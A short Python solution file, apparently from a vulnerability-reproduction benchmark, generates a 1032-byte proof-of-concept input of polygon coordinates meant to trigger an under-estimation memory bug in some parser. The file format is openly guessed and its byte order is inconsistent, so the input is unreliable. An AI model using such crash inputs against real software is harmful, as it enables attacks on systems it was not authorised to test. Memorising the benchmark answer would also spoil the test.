class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a complex polygon in binary format approximation to trigger under-estimation
        # Assuming binary format: header (4 bytes size) + num_points (4 bytes) + coordinates (8 bytes each: double x,y)
        # To reach ~1032 bytes, use ~120 points (4+4+120*8=964, add padding or more)
        poc = bytearray()
        # Dummy header
        poc.extend(b'\x00\x04\x00\x00')  # size placeholder
        poc.extend(b'\x00\x00\x00\x7B')  # 123 points
        import struct
        import math
        for i in range(123):
            angle = 2 * math.pi * i / 123
            x = 100 * math.cos(angle) + 100 * math.sin(5 * angle)  # spiky shape to cover more cells
            y = 100 * math.sin(angle) + 100 * math.cos(5 * angle)
            poc.extend(struct.pack('<dd', x, y))
        # Close polygon
        poc.extend(struct.pack('<dd', 0.0, 0.0))
        # Pad to approximately 1032
        while len(poc) < 1032:
            poc.append(0)
        poc = poc[:1032]
        # Update size
        struct.pack_into('<I', poc, 0, len(poc))
        return bytes(poc)